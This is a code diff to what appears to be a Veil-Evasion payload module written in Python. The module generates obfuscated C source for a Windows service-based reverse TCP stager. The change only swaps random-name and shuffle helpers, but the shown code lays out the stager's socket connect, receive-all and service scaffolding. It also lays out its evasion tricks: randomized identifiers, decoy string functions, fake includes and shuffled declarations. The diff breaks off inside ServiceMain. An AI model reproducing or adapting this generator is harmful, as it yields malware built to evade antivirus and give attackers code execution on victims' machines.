@@ -14,7 +14,6 @@ Module built by @the_grayhound
 """
 
 import random
-from modules.common import randomizer
 from modules.common import helpers
 
 class Payload:
@@ -34,10 +33,10 @@ class Payload:
         
     def generate(self):
             
-        winsock_init_name = randomizer.randomString()
-        punt_name = randomizer.randomString()
-        recv_all_name = randomizer.randomString()
-        wsconnect_name = randomizer.randomString()
+        winsock_init_name = helpers.randomString()
+        punt_name = helpers.randomString()
+        recv_all_name = helpers.randomString()
+        wsconnect_name = helpers.randomString()
         
         # the real includes needed
         includes = [ "#include <stdio.h>" , "#include <stdlib.h>", "#include <windows.h>", "#include <string.h>"]
@@ -49,29 +48,29 @@ class Payload:
         
         
         # TODO: add in more string processing functions
-        randName1 = randomizer.randomString() # reverse()
-        randName2 = randomizer.randomString() # doubles characters
+        randName1 = helpers.randomString() # reverse()
+        randName2 = helpers.randomString() # doubles characters
         stringModFunctions = [  (randName1, "char* %s(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\\0'; return t2; }" %(randName1)), 
                                 (randName2, "char* %s(char* s){ char *result =  malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\\0'; return result; }" %(randName2))
                             ]
                             
-        random.shuffle(stringModFunctions)
+        helpers.shuffle(stringModFunctions)
         
         # obsufcation - "logical nop" string generation functions
-        randString1 = randomizer.randomString(50)
-        randName1 = randomizer.randomString()
-        randVar1 = randomizer.randomString()
-        randName2 = randomizer.randomString()
-        randVar2 = randomizer.randomString()
-        randVar3 = randomizer.randomString()
-        randName3 = randomizer.randomString()
-        randVar4 = randomizer.randomString()
-        randVar5 = randomizer.randomString()
+        randString1 = helpers.randomString(50)
+        randName1 = helpers.randomString()
+        randVar1 = helpers.randomString()
+        randName2 = helpers.randomString()
+        randVar2 = helpers.randomString()
+        randVar3 = helpers.randomString()
+        randName3 = helpers.randomString()
+        randVar4 = helpers.randomString()
+        randVar5 = helpers.randomString()
         stringGenFunctions = [  (randName1, "char* %s(){ char *%s = %s(\"%s\"); return strstr( %s, \"%s\" );}" %(randName1, randVar1, stringModFunctions[0][0], randString1, randVar1, randString1[len(randString1)/2])),
-                                (randName2, "char* %s(){ char %s[%s/2], %s[%s/2]; strcpy(%s,\"%s\"); strcpy(%s,\"%s\"); return %s(strcat( %s, %s)); }" % (randName2, randVar2, max_string_length, randVar3, max_string_length, randVar2, randomizer.randomString(50), randVar3, randomizer.randomString(50), stringModFunctions[1][0], randVar2, randVar3)),
-                                (randName3, "char* %s() { char %s[%s] = \"%s\"; char *%s = strupr(%s); return strlwr(%s); }" % (randName3, randVar4, max_string_length, randomizer.randomString(50), randVar5, randVar4, randVar5))
+                                (randName2, "char* %s(){ char %s[%s/2], %s[%s/2]; strcpy(%s,\"%s\"); strcpy(%s,\"%s\"); return %s(strcat( %s, %s)); }" % (randName2, randVar2, max_string_length, randVar3, max_string_length, randVar2, helpers.randomString(50), randVar3, helpers.randomString(50), stringModFunctions[1][0], randVar2, randVar3)),
+                                (randName3, "char* %s() { char %s[%s] = \"%s\"; char *%s = strupr(%s); return strlwr(%s); }" % (randName3, randVar4, max_string_length, helpers.randomString(50), randVar5, randVar4, randVar5))
                              ]
-        random.shuffle(stringGenFunctions)
+        helpers.shuffle(stringGenFunctions)
         
         # obfuscation - add in our fake includes
         fake_includes = ["#include <sys/timeb.h>", "#include <time.h>", "#include <math.h>", "#include <signal.h>", "#include <stdarg.h>", 
@@ -81,7 +80,7 @@ class Payload:
             includes.append(fake_includes[x])
         
         # obsufcation - shuffle up our real and fake includes
-        random.shuffle(includes)
+        helpers.shuffle(includes)
 
         code = "#define _WIN32_WINNT 0x0500\n"
         code += "#include <winsock2.h>\n"
@@ -89,9 +88,9 @@ class Payload:
         
             
         # real - service related headers (check the stub)
-        hStatusName = randomizer.randomString()
+        hStatusName = helpers.randomString()
         serviceHeaders = ["SERVICE_STATUS ServiceStatus;","SERVICE_STATUS_HANDLE %s;" %(hStatusName), "void  ServiceMain(int argc, char** argv);", "void  ControlHandler(DWORD request);"]
-        random.shuffle(serviceHeaders)
+        helpers.shuffle(serviceHeaders)
         
         code += "\n".join(serviceHeaders)
         
@@ -100,8 +99,8 @@ class Payload:
         code += stringModFunctions[1][1] + "\n"
         
         # real - build the winsock_init function
-        wVersionRequested_name = randomizer.randomString()
-        wsaData_name = randomizer.randomString()
+        wVersionRequested_name = helpers.randomString()
+        wsaData_name = helpers.randomString()
         code += "void %s() {" % (winsock_init_name)
         code += "WORD %s = MAKEWORD(%s, %s); WSADATA %s;" % (wVersionRequested_name, helpers.obfuscateNum(2,4),helpers.obfuscateNum(2,4), wsaData_name)
         code += "if (WSAStartup(%s, &%s) < 0) { WSACleanup(); exit(1);}}\n" %(wVersionRequested_name,wsaData_name)
@@ -110,7 +109,7 @@ class Payload:
         code += stringGenFunctions[0][1] + "\n"
         
         # real - build punt function
-        my_socket_name = randomizer.randomString()
+        my_socket_name = helpers.randomString()
         code += "void %s(SOCKET %s) {" %(punt_name, my_socket_name)
         code += "closesocket(%s);" %(my_socket_name)
         code += "WSACleanup();"
@@ -120,9 +119,9 @@ class Payload:
         code += stringGenFunctions[1][1] + "\n"
         
         # real - build recv_all function
-        my_socket_name = randomizer.randomString()
-        buffer_name = randomizer.randomString()
-        len_name = randomizer.randomString()
+        my_socket_name = helpers.randomString()
+        buffer_name = helpers.randomString()
+        len_name = helpers.randomString()
         code += "int %s(SOCKET %s, void * %s, int %s){" %(recv_all_name, my_socket_name, buffer_name, len_name)
         code += "int slfkmklsDSA=0;int rcAmwSVM=0;"
         code += "void * startb = %s;" %(buffer_name)
@@ -135,9 +134,9 @@ class Payload:
         code += stringGenFunctions[2][1] + "\n"
 
         # real - build wsconnect function
-        target_name = randomizer.randomString()
-        sock_name = randomizer.randomString()
-        my_socket_name = randomizer.randomString()
+        target_name = helpers.randomString()
+        sock_name = helpers.randomString()
+        my_socket_name = helpers.randomString()
         code += "SOCKET %s() { struct hostent * %s; struct sockaddr_in %s; SOCKET %s;" % (wsconnect_name, target_name, sock_name, my_socket_name)
         code += "%s = socket(AF_INET, SOCK_STREAM, 0);" %(my_socket_name)
         code += "if (%s == INVALID_SOCKET) %s(%s);" %(my_socket_name, punt_name, my_socket_name);
@@ -151,13 +150,13 @@ class Payload:
         
         
         # real - main() method for the service code
-        serviceName = randomizer.randomString()
+        serviceName = helpers.randomString()
         code += "void main() { SERVICE_TABLE_ENTRY ServiceTable[2];"
         serviceTableEntries = [ "ServiceTable[0].lpServiceName = \"%s\";" %(serviceName), 
                                 "ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;",
                                 "ServiceTable[1].lpServiceName = NULL;",
                                 "ServiceTable[1].lpServiceProc = NULL;"]
-        random.shuffle(serviceTableEntries)
+        helpers.shuffle(serviceTableEntries)
         code += "\n".join(serviceTableEntries)
         code += "StartServiceCtrlDispatcher(ServiceTable);}\n"
         
@@ -170,7 +169,7 @@ class Payload:
                                 "ServiceStatus.dwServiceSpecificExitCode = 0;",
                                 "ServiceStatus.dwCheckPoint = 0;",
                                 "ServiceStatus.dwServiceType = SERVICE_WIN32;"]
-        random.shuffle(serviceStatusOptions)
+        helpers.shuffle(serviceStatusOptions)
         
         # real - serviceMain() code
         code += "void ServiceMain(int argc, char** argv) {\n"
@@ -184,18 +183,18 @@ class Payload:
         code += "while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {\n"
         
         # obsufcation - random variable names
-        size_name = randomizer.randomString()
-        buffer_name = randomizer.randomString()
-        function_name = randomizer.randomString()
-        my_socket_name = randomizer.randomString()
-        count_name = randomizer.randomString()
+        size_name = helpers.randomString()
+        buffer_name = helpers.randomString()
+        function_name = helpers.randomString()
+        my_socket_name = helpers.randomString()
+        count_name = helpers.randomString()
         
         # obsufcation - necessary declarations
-        char_array_name_1 = randomizer.randomString()
+        char_array_name_1 = helpers.randomString()
         number_of_strings_1 = random.randint(1,max_num_strings)
-        char_array_name_2 = randomizer.randomString()
+        char_array_name_2 = helpers.randomString()
         number_of_strings_2 = random.randint(1,max_num_strings)
-        char_array_name_3 = randomizer.randomString()
+        char_array_name_3 = helpers.randomString()
         number_of_strings_3 = random.randint(1,max_num_strings)
         
         # real - necessary declarations
